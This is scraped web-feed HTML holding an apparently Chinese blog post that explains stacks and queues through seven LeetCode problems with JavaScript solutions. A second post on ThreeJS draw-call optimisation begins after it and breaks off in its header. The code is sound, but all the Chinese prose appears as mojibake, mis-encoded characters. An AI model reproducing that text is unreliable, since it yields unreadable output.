            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”Ÿæ¤°ä¸ç»’æ‹¿é“
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:46:56.000Z" title="Tue Feb 03 2026 13:46:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½ ä»¥ä¸ºæ ˆå’Œé˜Ÿåˆ—åªæ˜¯æ•°æ®ç»“æ„è¯¾æœ¬ä¸Šçš„ä¸¤ä¸ªåè¯ï¼Ÿ<br/>
ä¸ï¼ä»–ä»¬æ˜¯åŠ›æ‰£é¢˜æµ·é‡Œæœ€é»˜å¥‘çš„â€œåŒå­æ˜Ÿâ€â€”â€”ä¸€ä¸ªåè¿›å…ˆå‡ºï¼Œä¸€ä¸ªå…ˆè¿›å…ˆå‡ºï¼›ä¸€ä¸ªåƒå ç›˜å­ï¼Œä¸€ä¸ªåƒæ’é˜Ÿä¹°å¥¶èŒ¶ã€‚<br/>
ä»Šå¤©ï¼Œæˆ‘ä»¬å°±ç”¨7é“ç»å…¸é¢˜ï¼Œæ­å¼€è¿™å¯¹â€œå†¤å®¶â€çš„çœŸé¢ç›®ï¼</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ğŸŒŸ å¼•å­ï¼šä¸ºä»€ä¹ˆæ ˆå’Œé˜Ÿåˆ—æ€»è¢«ä¸€èµ·è®²ï¼Ÿ</h2>
<p>å› ä¸ºå®ƒä»¬<strong>ç®€å•ä½†å¼ºå¤§</strong>ï¼</p>
<ul>
<li><strong>æ ˆï¼ˆStackï¼‰</strong> ï¼šLIFOï¼ˆLast In First Outï¼‰ï¼Œå°±åƒä½ å¾€æ¡Œä¸Šå ç›˜å­ï¼Œæœ€åæ”¾ä¸Šå»çš„æœ€å…ˆæ‹¿èµ°ã€‚</li>
<li><strong>é˜Ÿåˆ—ï¼ˆQueueï¼‰</strong> ï¼šFIFOï¼ˆFirst In First Outï¼‰ï¼Œå°±åƒä½ åœ¨å–œèŒ¶é—¨å£æ’é˜Ÿï¼Œå…ˆæ¥çš„å…ˆå–ã€‚</li>
</ul>
<p>ä½†åˆ«å°çœ‹å®ƒä»¬â€”â€”<strong>æ‹¬å·åŒ¹é…ã€è¡¨è¾¾å¼æ±‚å€¼ã€æ»‘åŠ¨çª—å£ã€é«˜é¢‘å…ƒç´ â€¦â€¦ç”šè‡³äº’ç›¸æ¨¡æ‹Ÿå¯¹æ–¹ï¼</strong> åŠ›æ‰£ä¸­å¤§é‡ä¸­ç­‰é¢˜éƒ½é å®ƒä»¬â€œæ’‘åœºå­â€ã€‚</p>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬è¾¹åˆ·é¢˜è¾¹æ‚Ÿé“ï¼</p>
<hr/>
<h2 data-id="heading-1">ğŸ”¥ é¢˜1ï¼šæœ‰æ•ˆçš„æ‹¬å·ï¼ˆLeetCode 20ï¼‰â€”â€”æ ˆçš„â€œå¤„å¥³ç§€â€</h2>
<blockquote>
<p>ç»™å®š <code>"()[]{}"</code>ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æ•ˆã€‚</p>
</blockquote>
<p><strong>æ€è·¯</strong>ï¼šé‡åˆ°å·¦æ‹¬å· <code>(</code>ã€<code>[</code>ã€<code>{</code>ï¼Œå°±æŠŠå¯¹åº”çš„å³æ‹¬å·å‹å…¥æ ˆï¼›é‡åˆ°å³æ‹¬å·ï¼Œå°±çœ‹å®ƒæ˜¯å¦ç­‰äºæ ˆé¡¶ã€‚ä¸ç­‰ï¼Ÿç›´æ¥ <code>false</code>ï¼</p>
<pre><code class="hljs language-arduino" lang="arduino">var isValid = <span class="hljs-built_in">function</span>(s) {
  <span class="hljs-type">const</span> stack = [];
  <span class="hljs-keyword">for</span> (let c of s) {
    <span class="hljs-keyword">switch</span> (c) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'('</span>: stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">')'</span>); <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'['</span>: stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">']'</span>); <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-string">'{'</span>: stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">'}'</span>); <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">if</span> (c !== stack.<span class="hljs-built_in">pop</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
  }
  <span class="hljs-keyword">return</span> stack.length === <span class="hljs-number">0</span>;
};
</code></pre>
<p>ğŸ’¡ <strong>å¹½é»˜ç‚¹</strong>ï¼šè¿™é¢˜å°±åƒç›¸äº²â€”â€”å·¦æ‹¬å·æ˜¯â€œå‘å‡ºé‚€è¯·â€ï¼Œå³æ‹¬å·æ˜¯â€œèµ´çº¦â€ã€‚å¦‚æœèµ´çº¦çš„äººä¸å¯¹ï¼ˆæ¯”å¦‚ <code>{</code> é…äº† <code>]</code>ï¼‰ï¼Œé‚£è¿™åœºçº¦ä¼šå°±é»„äº†ï¼</p>
<hr/>
<h2 data-id="heading-2">ğŸ§¹ é¢˜2ï¼šåˆ é™¤ç›¸é‚»é‡å¤é¡¹ï¼ˆLeetCode 1047ï¼‰â€”â€”æ ˆçš„â€œæ¶ˆæ¶ˆä¹â€æ¨¡å¼</h2>
<blockquote>
<p>è¾“å…¥ <code>"abbaca"</code> â†’ è¾“å‡º <code>"ca"</code>ï¼ˆå…ˆåˆ  <code>bb</code>ï¼Œå†åˆ  <code>aa</code>ï¼‰</p>
</blockquote>
<p><strong>æ€è·¯</strong>ï¼šéå†å­—ç¬¦ä¸²ï¼Œè‹¥å½“å‰å­—ç¬¦å’Œæ ˆé¡¶ç›¸åŒï¼Œå°±å¼¹å‡ºï¼ˆæ¶ˆæ‰ï¼‰ï¼›å¦åˆ™å‹å…¥ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">var removeDuplicates = <span class="hljs-built_in">function</span>(s) {
  <span class="hljs-type">const</span> stack = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> x of s) {
    <span class="hljs-keyword">if</span> (stack.length &amp;&amp; x === stack[stack.length - <span class="hljs-number">1</span>]) {
      stack.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// æ¶ˆæ¶ˆä¹ï¼</span>
    } <span class="hljs-keyword">else</span> {
      stack.<span class="hljs-built_in">push</span>(x);
    }
  }
  <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">join</span>(<span class="hljs-string">""</span>);
};
</code></pre>
<p>ğŸ¯ <strong>æ€è€ƒ</strong>ï¼šè¿™ä¸å°±æ˜¯ç«¥å¹´ç©çš„â€œè¿è¿çœ‹â€å—ï¼Ÿæ ˆå°±æ˜¯ä½ çš„â€œæ¶ˆé™¤è®°å¿†å™¨â€ï¼</p>
<hr/>
<h2 data-id="heading-3">ğŸ§® é¢˜3ï¼šé€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼ï¼ˆLeetCode 150ï¼‰â€”â€”æ ˆçš„â€œè®¡ç®—å™¨â€èº«ä»½</h2>
<blockquote>
<p>è¾“å…¥ <code>["2","1","+","3","*"]</code> â†’ è¾“å‡º <code>9</code>ï¼ˆå³ <code>(2+1)*3</code>ï¼‰</p>
</blockquote>
<p><strong>æ€è·¯</strong>ï¼šé‡åˆ°æ•°å­—å°±å‹æ ˆï¼›é‡åˆ°è¿ç®—ç¬¦ï¼Œå¼¹å‡ºä¸¤ä¸ªæ•°è®¡ç®—åå†å‹å›å»ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> evalRPN = <span class="hljs-keyword">function</span>(<span class="hljs-params">tokens</span>) {
  <span class="hljs-keyword">const</span> ops = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([
    [<span class="hljs-string">"+"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b + a],
    [<span class="hljs-string">"-"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b - a],
    [<span class="hljs-string">"*"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b * a],
    [<span class="hljs-string">"/"</span>, <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">trunc</span>(b / a)]
  ]);
  <span class="hljs-keyword">const</span> stack = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> t <span class="hljs-keyword">of</span> tokens) {
    <span class="hljs-keyword">if</span> (ops.<span class="hljs-title function_">has</span>(t)) {
      stack.<span class="hljs-title function_">push</span>(ops.<span class="hljs-title function_">get</span>(t)(stack.<span class="hljs-title function_">pop</span>(), stack.<span class="hljs-title function_">pop</span>()));
    } <span class="hljs-keyword">else</span> {
      stack.<span class="hljs-title function_">push</span>(<span class="hljs-title class_">Number</span>(t));
    }
  }
  <span class="hljs-keyword">return</span> stack.<span class="hljs-title function_">pop</span>();
};
</code></pre>
<p>ğŸ§  <strong>å†·çŸ¥è¯†</strong>ï¼šé€†æ³¢å…°è¡¨è¾¾å¼ä¸éœ€è¦æ‹¬å·ï¼æ ˆå¤©ç„¶é€‚åˆå¤„ç†è¿™ç§â€œåç¼€è¡¨è¾¾å¼â€ã€‚</p>
<hr/>
<h2 data-id="heading-4">ğŸ“Š é¢˜4ï¼šå‰Kä¸ªé«˜é¢‘å…ƒç´ ï¼ˆLeetCode 347ï¼‰â€”â€”é˜Ÿåˆ—çš„â€œæ›¿è¡¥ç™»åœºâ€</h2>
<blockquote>
<p>è™½ç„¶è¿™é¢˜å¸¸ç”¨å †ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨<strong>Map + æ’åº</strong>æå®šï¼ˆé¢è¯•æ—¶å¯æä¼˜å…ˆé˜Ÿåˆ—ä¼˜åŒ–ï¼‰ã€‚</p>
</blockquote>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">topKFrequent</span> = function(nums, k) {
  const <span class="hljs-attr">map</span> = new Map()<span class="hljs-comment">;</span>
  for (let n of nums) map.set(n, (map.get(n) || 0) + 1)<span class="hljs-comment">;</span>
  
  return Array.from(map)
    .sort((a, b) =&gt; b<span class="hljs-section">[1]</span> - a<span class="hljs-section">[1]</span>)
    .slice(0, k)
    .map(<span class="hljs-attr">item</span> =&gt; item[<span class="hljs-number">0</span>])<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>ğŸ“Œ <strong>è¿›é˜¶æç¤º</strong>ï¼šçœŸæ­£é«˜æ•ˆçš„åšæ³•æ˜¯ç”¨**æœ€å°å †ï¼ˆä¼˜å…ˆé˜Ÿåˆ—ï¼‰**ç»´æŠ¤Top Kï¼Œæ—¶é—´å¤æ‚åº¦ O(n log k)ã€‚ä½†JSæ²¡æœ‰å†…ç½®å †ï¼Œæ‰€ä»¥æ’åºä¹ŸOKï¼</p>
<hr/>
<h2 data-id="heading-5">ğŸªŸ é¢˜5ï¼šæ»‘åŠ¨çª—å£æœ€å¤§å€¼ï¼ˆLeetCode 239ï¼‰â€”â€”å•è°ƒé˜Ÿåˆ—çš„é«˜å…‰æ—¶åˆ»ï¼</h2>
<blockquote>
<p>æ•°ç»„ <code>[1,3,-1,-3,5,3,6,7]</code>ï¼Œçª—å£å¤§å°3 â†’ è¾“å‡º <code>[3,3,5,5,6,7]</code></p>
</blockquote>
<p><strong>éš¾ç‚¹</strong>ï¼šæš´åŠ›æ³• O(nk) ä¼šè¶…æ—¶ï¼æˆ‘ä»¬éœ€è¦ <strong>O(n)</strong> è§£æ³•ã€‚</p>
<p><strong>è§£æ³•</strong>ï¼šç”¨<strong>åŒç«¯é˜Ÿåˆ—ï¼ˆdequeï¼‰ç»´æŠ¤å•è°ƒé€’å‡ä¸‹æ ‡</strong>ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">maxSlidingWindow</span> = function(nums, k) {
  const <span class="hljs-attr">q</span> = []<span class="hljs-comment">; // å­˜ä¸‹æ ‡ï¼Œé˜Ÿé¦–æ°¸è¿œæ˜¯å½“å‰çª—å£æœ€å¤§å€¼çš„ä¸‹æ ‡</span>
  const <span class="hljs-attr">ans</span> = []<span class="hljs-comment">;</span>

  for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; k; i++) {</span>
    while (q.length &amp;&amp; nums<span class="hljs-section">[i]</span> &gt;= nums<span class="hljs-section">[q.at(-1)]</span>) q.pop()<span class="hljs-comment">;</span>
    q.push(i)<span class="hljs-comment">;</span>
  }
  ans.push(nums<span class="hljs-section">[q[0]]</span>)<span class="hljs-comment">;</span>

  for (let <span class="hljs-attr">i</span> = k<span class="hljs-comment">; i &lt; nums.length; i++) {</span>
    while (q.length &amp;&amp; nums<span class="hljs-section">[i]</span> &gt;= nums<span class="hljs-section">[q.at(-1)]</span>) q.pop()<span class="hljs-comment">;</span>
    q.push(i)<span class="hljs-comment">;</span>
    if (q<span class="hljs-section">[0]</span> &lt;= i - k) q.shift()<span class="hljs-comment">; // ç§»é™¤è¿‡æœŸä¸‹æ ‡</span>
    ans.push(nums<span class="hljs-section">[q[0]]</span>)<span class="hljs-comment">;</span>
  }
  return ans<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>ğŸ”¥ <strong>çµé­‚æ¯”å–»</strong>ï¼šè¿™ä¸ªé˜Ÿåˆ—å°±åƒä¸€ä¸ªâ€œä¿é•–å›¢é˜Ÿâ€â€”â€”æ–°æ¥çš„ä¿é•–ï¼ˆæ•°å­—ï¼‰å¦‚æœæ¯”è€ä¿é•–å¼ºï¼Œå°±æŠŠå¼±çš„è¸¢å‡ºå»ï¼Œåªç•™ä¸‹æœ€å¼ºçš„ç«™åœ¨å‰é¢ï¼</p>
<hr/>
<h2 data-id="heading-6">ğŸ”„ é¢˜6 &amp; 7ï¼šæ ˆä¸é˜Ÿåˆ—çš„â€œäº’ç›¸æ¨¡ä»¿ç§€â€</h2>
<h3 data-id="heading-7">ç”¨æ ˆå®ç°é˜Ÿåˆ—ï¼ˆLeetCode 232ï¼‰</h3>
<p>ä¸¤ä¸ªæ ˆï¼š<code>inStack</code> è´Ÿè´£å…¥é˜Ÿï¼Œ<code>outStack</code> è´Ÿè´£å‡ºé˜Ÿã€‚<br/>
å½“ <code>outStack</code> ç©ºäº†ï¼Œå°±æŠŠ <code>inStack</code> å…¨éƒ¨å€’è¿‡æ¥ï¼</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">var</span> MyQueue = function() {
  <span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span> = []; <span class="hljs-comment">// in stack</span>
  <span class="hljs-keyword">this</span>.os = []; <span class="hljs-comment">// out stack</span>
};

MyQueue.prototype.push = function(x) { <span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span>.push(x); };

MyQueue.prototype.pop = function() {
  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.os.length) {
    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span>.length) <span class="hljs-keyword">this</span>.os.push(<span class="hljs-keyword">this</span>.<span class="hljs-keyword">is</span>.pop());
  }
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.os.pop();
};
</code></pre>
<h3 data-id="heading-8">ç”¨é˜Ÿåˆ—å®ç°æ ˆï¼ˆLeetCode 225ï¼‰</h3>
<p>ä¸€ä¸ªé˜Ÿåˆ—å°±å¤Ÿäº†ï¼æ¯æ¬¡ <code>push</code> åï¼ŒæŠŠå‰é¢çš„å…ƒç´ å…¨ç§»åˆ°åé¢ï¼Œè®©æ–°å…ƒç´ â€œç«™Cä½â€ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">MyStack.prototype.push = <span class="hljs-built_in">function</span>(x) {
  <span class="hljs-keyword">this</span>.queue.<span class="hljs-built_in">push</span>(x);
  let size = <span class="hljs-keyword">this</span>.queue.length;
  <span class="hljs-keyword">while</span> (--size) { <span class="hljs-comment">// æŠŠå‰é¢çš„n-1ä¸ªæŒªåˆ°åé¢</span>
    <span class="hljs-keyword">this</span>.queue.<span class="hljs-built_in">push</span>(<span class="hljs-keyword">this</span>.queue.<span class="hljs-built_in">shift</span>());
  }
};
</code></pre>
<p>ğŸ­ <strong>å¹½é»˜æ€»ç»“</strong>ï¼š</p>
<ul>
<li><strong>æ ˆæ¨¡æ‹Ÿé˜Ÿåˆ—</strong>ï¼šåƒæŠŠä¸€æ‘ä¹¦å€’è¿›å¦ä¸€ä¸ªç®±å­ï¼Œé¡ºåºå°±åè¿‡æ¥äº†ã€‚</li>
<li><strong>é˜Ÿåˆ—æ¨¡æ‹Ÿæ ˆ</strong>ï¼šåƒåœ¨é˜Ÿä¼æœ«å°¾æ’é˜Ÿåï¼Œç«‹åˆ»æŠŠå‰é¢æ‰€æœ‰äººè¯·åˆ°ä½ åé¢â€”â€”ä½ å°±æˆäº†â€œæœ€åä¸€ä¸ªè¿›ï¼Œç¬¬ä¸€ä¸ªå‡ºâ€ï¼</li>
</ul>
<hr/>
<h2 data-id="heading-9">âœ… æ€»ç»“ï¼šæ ˆä¸é˜Ÿåˆ—çš„â€œæ­¦åŠŸç§˜ç±â€</h2>



































<table><thead><tr><th>åœºæ™¯</th><th>æ•°æ®ç»“æ„</th><th>æ ¸å¿ƒæ€æƒ³</th></tr></thead><tbody><tr><td>æ‹¬å·åŒ¹é…ã€è¡¨è¾¾å¼æ±‚å€¼</td><td><strong>æ ˆ</strong></td><td>åè¿›å…ˆå‡ºï¼Œå¤©ç„¶åŒ¹é…åµŒå¥—ç»“æ„</td></tr><tr><td>æ¶ˆé™¤ç›¸é‚»é‡å¤</td><td><strong>æ ˆ</strong></td><td>å¯¹æ¯”æ ˆé¡¶ï¼Œç›¸åŒåˆ™æ¶ˆ</td></tr><tr><td>æ»‘åŠ¨çª—å£æœ€å€¼</td><td><strong>å•è°ƒé˜Ÿåˆ—</strong></td><td>ç»´æŠ¤é€’å‡/é€’å¢ï¼Œé˜Ÿé¦–å³ç­”æ¡ˆ</td></tr><tr><td>FIFOè¡Œä¸º</td><td><strong>é˜Ÿåˆ—</strong></td><td>å…ˆæ¥å…ˆæœåŠ¡</td></tr><tr><td>äº’ç›¸å®ç°</td><td><strong>åŒæ ˆ or å•é˜Ÿåˆ—</strong></td><td>åˆ©ç”¨â€œå€’è…¾â€æ”¹å˜é¡ºåº</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">ğŸ’¬ å†™åœ¨æœ€å</h2>
<p>æ ˆå’Œé˜Ÿåˆ—ï¼Œçœ‹ä¼¼ç®€å•ï¼Œå´æ˜¯<strong>ç®—æ³•ä¸–ç•Œçš„åŸºçŸ³</strong>ã€‚<br/>
æŒæ¡å®ƒä»¬ï¼Œä½ ä¸ä»…èƒ½ç§’æ€æ‹¬å·é¢˜ï¼Œè¿˜èƒ½åœ¨ç³»ç»Ÿè®¾è®¡ä¸­ä¼˜é›…å¤„ç†ä»»åŠ¡è°ƒåº¦ã€ç¼“å­˜æ·˜æ±°ã€è¡¨è¾¾å¼è§£æâ€¦â€¦</p>
<blockquote>
<p><strong>è®°ä½</strong>ï¼š</p>
<ul>
<li>é‡åˆ°â€œæœ€è¿‘ç›¸å…³æ€§â€ â†’ æƒ³æ ˆ</li>
<li>é‡åˆ°â€œé¡ºåºå¤„ç†â€ â†’ æƒ³é˜Ÿåˆ—</li>
<li>é‡åˆ°â€œæœ€å€¼æ»‘åŠ¨â€ â†’ æƒ³å•è°ƒé˜Ÿåˆ—</li>
</ul>
</blockquote>
<p>ä¸‹æ¬¡åˆ·é¢˜æ—¶ï¼Œä¸å¦¨é—®è‡ªå·±ä¸€å¥ï¼š <strong>â€œä»Šå¤©ï¼Œæ ˆå’Œé˜Ÿåˆ—è°æ›´é€‚åˆå½“ä¸»è§’ï¼Ÿâ€</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ThreeJSå®æˆ˜ã€‘æˆ‘æŠŠ200ä¸ªè®¾å¤‡ä¼˜åŒ–åˆ°äº†1ä¸ªDrawCall]]></title>    <link>https://juejin.cn/post/7602454700503924777</link>    <guid>https://juejin.cn/post/7602454700503924777</guid>    <pubDate>2026-02-03T15:25:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700503924777" data-draft-id="7602106969697763391" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ThreeJSå®æˆ˜ã€‘æˆ‘æŠŠ200ä¸ªè®¾å¤‡ä¼˜åŒ–åˆ°äº†1ä¸ªDrawCall"/> <meta itemprop="keywords" content="three.js,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-02-03T15:25:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¶æ™ºè¾½"/> <meta itemprop="url" content="https://juejin.cn/user/3320999244205294"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ThreeJSå®æˆ˜ã€‘æˆ‘æŠŠ200ä¸ªè®¾å¤‡ä¼˜åŒ–åˆ°äº†1ä¸ªDrawCall
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3320999244205294/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¶æ™ºè¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T15:25:21.000Z" title="Tue Feb 03 2026 15:25:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
